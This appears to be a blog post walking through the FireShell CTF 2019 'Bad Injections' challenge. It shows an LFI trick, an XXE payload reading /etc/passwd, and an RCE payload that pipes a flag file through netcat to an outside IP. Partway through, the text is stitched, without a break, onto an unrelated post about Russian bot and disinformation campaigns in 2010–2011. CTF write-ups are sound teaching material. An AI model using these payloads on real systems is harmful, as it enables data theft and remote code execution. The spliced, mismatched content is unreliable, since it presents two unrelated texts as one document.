---
layout: post
title: FireShell CTF 2019 - Bad Injections
permalink: badInjections 
date: 2019-01-27
comments: 1
categories: CTF
tags: writeup
---
Today <strong id="peepee">FireShell CTF 2019</strong> wrapped up and ended. I had fun and i learned a lot. Coming into the ctf, i was expecting something a little more complicated than trivial, however it proved to be quite a challenge for my first ever serious ctf attempt. I decided to take on the most solved Web Application challenge called "<strong>Bad Injections</strong>". With the help of my amazing friends and fellow contenders i came close to solving it, but ran out of energy at 2AM, 2 hours away from the end of the ctf. 

The website greets us with 4 tabs and has a great deal of red herrings. The about page has SQL code hidden in its source file and the contact-us page has a non-functional feedback form. Really the only tab of interest is the List tab. It displays two images with one appearing to be broken. Upon closer inspection, it turns out that it's not an image, but a text file. 

It's particularly interesting how it is retrieved: {% highlight html %}<img src="download?file=files/test.txt&amp;hash=293d05cb2ced82858519bdec71a0354b" height="500">{% endhighlight %}

The website uses /download and passes it two parameters: <strong>file path and name + a hash</strong>. Quick look in a hash analyzer tells us it's most likely MD5, which can easily be broken. 

{% highlight language %}293d05cb2ced82858519bdec71a0354b{% endhighlight %}This hash when broken reveals the first parameter, {% highlight js %}files/test.txt{% endhighlight %} Lets explore how we can use this newfound knowledge and issue a manual GET request to {% highlight js %}download?file=files/test.txt&amp;hash=293d05cb2ced82858519bdec71a0354b{% endhighlight %}

We get an error in the response body: 

{% highlight language %}
<br />
<b>Notice</b>:  Undefined variable: type in <b>/app/Controllers/Download.php</b> on line <b>21</b><br />
{% endhighlight %}

<h2>Local File Inclusion</h2>

Conveniently this error gives us a path for Download.php. Knowing the file path, we can get the second parameter by hashing it and indeed, this works when we issue the request. We get the php source of Download.php. I researched directory structures of a couple php frameworks and this structure looked to me like CakePHP 2.x and to confirm it i tried getting .htaccess on the same level as the app folder. Indeed i got it. Knowing it is CakePHP, there's no need to bruteforce or do directory discovery (<strong>and both were banned by the ctf organizers anyways</strong>), as we can just try to get the routing rules of the server from Routes.php. This gives us the list of resources for the website: {% highlight js %}AboutUs.php, Admin.php, ContactUs.php, Custom.php, Download.php, Lista.php, Routes.php, Verify.php, index.php{% endhighlight %}

Here again we encouter a bunch of red herrings: Verify.php issues a Curl command and some of the people i collaborated with thought this was exploitable, but it wasn't. There's this SQL code {% highlight js %}SELECT * FROM users{% endhighlight %} in AboutUs.php, which is useless. ContactUS.php doesn't do anything, neither does Index.php or Lista.php. The only two files of interest here are Admin.php and Custom.php.

First lets look how Custom is invoked in Routes.php:
{% highlight php %}
Route::set('custom',function(){
  $handler = fopen('php://input','r');
  $data = stream_get_contents($handler);
  if(strlen($data) > 1){
    Custom::Test($data);
  }else{
    Custom::createView('Custom');
  }
});
{% endhighlight %}

It takes user input and calls the Test function. Now onto Custom.php:
{% highlight php %}
public static function Test($string){
    $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
    $test = $root->name;
    echo $test;
}
{% endhighlight %}

<h2>XML External Entity Injection</h2>

The Test function takes in the input and parses it as XML. Certainly issuing a GET request to /custom doesn't do anything and as was suggested to me by <strong>TheZakMan</strong> on the FireShell discord, i tried issuing a POST request to it and it worked. He sent it a piece of XML and discovered that it is vulnerable to <strong>Xml External Entity injection</strong>. I've never muddled in anything related to XML before, so it was a learning experience for me. I managed to inject the XMl code and read the first line of etc/passwd, but the rest was cut off by a million errors. Not before <strong>sixcross</strong> on discord showed me his XML code, i realized that i only got a messy response with mine because of some issue about single and double quotes.

This XML payload gave me a working injection:
{% highlight xml %}
<?xml version='1.0'?> 
<!DOCTYPE foo [<!ELEMENT name ANY >
<!ENTITY result SYSTEM 'file:///etc/passwd'>]>
<foo>
  <name>&result;</name>
</foo>
{% endhighlight %}

<h2>Server-Side Request Forgery</h2>

Now onto Routes.php to take a look at how the admin page is invoked:
{% highlight php %}
Route::set('admin',function(){
  if(!isset($_REQUEST['rss']) && !isset($_REQUES['order'])){
    Admin::createView('Admin');
  }else{
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    }else{
     echo ";(";
    }
  }
});
{% endhighlight %}

As you can see here, a condition prevents us from directly accessing the /admin page:
{% highlight php %}
if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
    Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
{% endhighlight %}

Only if we come from IPV4 or IPV6 localhost can we call Admin::sort.

Now lets see what Admin.php does:
{% highlight php %}
$uri = parse_url($url);
    $file = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadXML($file,LIBXML_NOENT | LIBXML_DTDLOAD);
    $xml = simplexml_import_dom($dom);
{% endhighlight %}

It accepts XML input. <strong>sixcross</strong> suggested we try injecting a command to get <strong>remote code execution</strong> through this part: 
{% highlight php %}usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));{% endhighlight %}

<h2>Remote Code Execution</h2>

He was absolutely right. I also noticed that the first parameter "rss" is accepted as an XML, however this was the furthest i got before my brain ceased to function at 2AM. 

The credit for the rest of it goes to the writeup by <strong>OmniscientSec</strong>. He discovered that not only does the first parameter accept XML, but that the second one accepts <strong>arbitrary code</strong>.

With the following payload he managed to exfil the flag with netcat:
{% highlight xml %}
http://127.0.0.1/admin?rss=http://45.76.39.243/a.xml&order=link.file_get_contents('
http://{your_ip}/'.exec('cat'.chr(32).
'/da0f72d5d79169971b62a479c34198e7'.chr(124).'/bin/nc'.chr(32).'45.76.39.243'.chr(32).'1234'))"
{% endhighlight %}

Funny enough, the flag fully describes my experience with this challenge:
{% highlight language %}
f#{1_d0nt_kn0w_wh4t_i4m_d01ng}
{% endhighlight %}

<h2>Conclusion</h2>

In conclusion, this challenge has proven to be a challenge and i learned a lot when trying to solve it. I ultimately failed, but i learned so much about PHP, XML and URL parameters that i feel like in my next CTF i will certainly be able to solve a challenge of this difficulty, given enough time.

<h3>Thanks go to:</h3>
<strong>kronie</strong> for helping me understand PHP,
<strong>TheZakMan</strong> for figuring out there is an XML injection,
<strong>sixcross</strong> for his XML payload and figuring out RCE,
OmniscientSec for solving the challenge, unlike the rest of us peasants
and most importantly to <strong>FireShell CTF</strong> for making an awesome challenge.

This blogpost is a work of over a week’s worth of full-time research using publicly available sources of information. I’m not associated with the CIA and my sources are limited to Google, news media and leaks. That said, even with a limited number of sources, there is too much information on the topic and it's impossible to include all of it without making the blogpost impossibly long. I tried to condense the material as much as I could and provide as many references as I could, so that you could all examine the information I used to draw conclusions, if you would like to. Many of the sources I list are in Russian, but you should still be able to examine most of them with Google’s page translation. Please report any broken links and I’ll do my best to fix them. Overall, the blogpost describes how Russia’s disinformation and bot infrastructure came to be. Due to its nature, we may lack crucial information that will come out in later years and if it does, I’ll correct my article. The blogpost isn’t intended to instill some kind of hate against Russians, in fact, if you read through it, you’ll realize that Russian citizens are oppressed and put down by Kremlin’s propaganda infrastructure in a way that people in the West never will be. If you have any feedback, I’ll be happy to hear it out.

---

**Table of Contents:**
1. [Before 2010](#2010)
2. [2011](#2011)
3. [2012](#2012)
4. [2013](#2013)
5. [2014](#2014)
6. [2015](#2015)
7. [2016](#2016)
8. [2017](#2017)
9. [2018](#2018)
10. [2019](#2019)
11. [2020](#2020)
12. [Conclusion](#conclusion)

---

<h3 id="2010">2010 and Prior:</h3>
Russian leadership had always been wary of the internet and Vladimir Putin went as far as to say that the internet has been and always will be *“a project of the CIA”*. By 2008 Vladimir Putin’s administration had largely taken control of public television, with federal news channels promoting messages favorable to the Kremlin, but mostly left the internet to its own devices. A shift in policy occurred when president Dimitry Medvedev was elected. Medvedev was seen by many as a technologically progressive politician who recognized the importance of the internet and social media. He toured Twitter headquarters in Silicon Valley, got himself an iPhone and signed an order creating the *Federal Service for Supervision of Communications, Information Technology and Mass Media* (shortened to “Roskomnadzor”). Its creation in 2008 signified a change in how the Russian government viewed the Internet, which was largely unregulated before that. Roskomnadzor was formally tasked with carrying out censorship in mass media and policing the processing of personal information on the internet. It would later become famous for its failed attempts at blocking the Telegram messenger between the years of 2016 and 2020, but at the time of its creation, it was not particularly involved in controlling the Russian internet. One important organization that came into existence around the same time was *“Nashi”* (Translated: “Ours”), lovingly called the “nascists” by Russian opposition, an obvious comparison to fascists. The reason they were compared to fascists was because Nashi was running a summer camp for Russian youth that fostered a network of pro-government political activists and was given generous grants for it by the Kremlin (similar to Hitler Youth). Starting from 2008, their summer camp became open to the public and was funded directly by the Russian government. Nashi recognized early that the internet will be the next big battleground for hearts and minds, and they began to employ their activists online.
> **Key Takeaways:**
- Russian government takes interest in the internet’s utility
- Pro-government activists look to increase their online presence

<h3 id="2011">2011:</h3>
Bots were often involved in various apolitical activities, mainly spam and mass-account compromise, but 2011 saw their wide employment in various domestic political matters. Novaya Gazeta, a Russian opposition news outlet wrote in 2011 that “Nascists have occupied the top spots in LiveJournal and Yandex” (both popular blogging platforms) and proceeded to explain that nearly half of all top blogs are in that position thanks solely to botting. “There is a huge number of previously registered accounts, all of which are empty. They only have 1 post so that search engines index them. Whenever there is a post that needs to be promoted, a certain number of these robots is activated and they automatically repost that in their own journal” - explains one blogger. In December of 2011, many Russians went to protest the disputed parliamentary elections and Russian police ended up arresting many, including the head of Russian opposition - Alexei Navalny. His supporters took to Twitter to express their displeasure and propelled several election-related hashtags into popularity. Brian Krebs reported the observations of threat researchers at Trend Micro: “if you currently check [Navalny’s] hashtag on Twitter you’ll see a flood of 5-7 identical tweets from accounts that have been inactive for months and that only had 10-20 tweets before this day. To this point those hacked accounts have already posted 10-20 more tweets in just one hour”. Trend Micro identified several thousand accounts and according to Krebs “Some of the bot messages include completely unrelated hashtags or keywords, seemingly to pollute the news stream for the protester hashtags”. The coordinated spam-campaign was accompanied by DDoS attacks on several liberal and opposition newspapers. The Guardian reports that the DDoS attacks were coupled with phone bombing of the same newspapers - employees of Novaya Gazeta were getting non-stop calls that would all deliver similar messages on repeat: "Putin is very good”, “Putin loves you”, “Putin makes your life happy”, etc. One website that was being DDoSed that year was Kommersant. Kommersant ran an article harshly criticizing the Nashi movement earlier that year and since attacks on the paper came after it, they suspected that Nashi were responsible for the denial of service and they were correct. They would be proven right next year, when Nashi’s emails were hacked and posted online by the Russian “Anonymous”. 
**Key Takeaways:**
- Pro-government activists begin to employ a botnet to silence dissenting opposition voices with DDoS and social media spam
